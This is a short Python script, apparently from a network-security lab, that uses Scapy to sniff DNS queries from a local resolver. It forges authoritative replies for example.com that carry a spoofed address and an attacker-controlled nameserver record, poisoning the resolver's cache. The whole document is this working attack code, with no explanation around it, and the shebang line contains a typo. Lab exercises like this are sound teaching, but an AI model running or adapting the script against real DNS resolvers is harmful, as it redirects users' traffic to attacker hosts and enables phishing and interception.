#!/usr/bin/env pythoni3
from scapy.all import *

ns_domain = 'ns.attacker32.com'
target_domain = 'example.com'
spoofed_IP = '1.2.3.4'
my_iface = 'br-7dfe462efbcd'
port_num = 53
target = '10.9.0.53'
my_filter = 'udp and src host {A} and dst port 53'.format(A=target)

print("Local DNS Cache Poisoning Attack (NS section)")

def spoof_dns(pkt):
    if (DNS in pkt and target_domain in pkt[DNS].qd.qname.decode('utf-8')):
        print("Sniffing & Spoofing ...")
        
        old_ip = pkt[IP]
        old_udp = pkt[UDP]
        old_dns = pkt[DNS]
        
        IPpkt = IP(dst=old_ip.src, src=old_ip.dst)
        UDPpkt = UDP(dport=old_udp.sport, sport=port_num)

        # The Answer Section
        Anssec = DNSRR(rrname=old_dns.qd.qname, type='A', ttl=259200, rdata=spoofed_IP)
        
        # The Authority Section
        NSsec = DNSRR(rrname=target_domain, type='NS', ttl=259200, rdata=ns_domain)

        # Construct the DNS packet
        DNSpkt = DNS(id=old_dns.id, qd=old_dns.qd, aa=1, qr=1,  
                     qdcount=1, ancount=1, nscount=1, an=Anssec, ns=NSsec)

        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)

pkt = sniff(iface=my_iface, filter=my_filter, prn=spoof_dns)

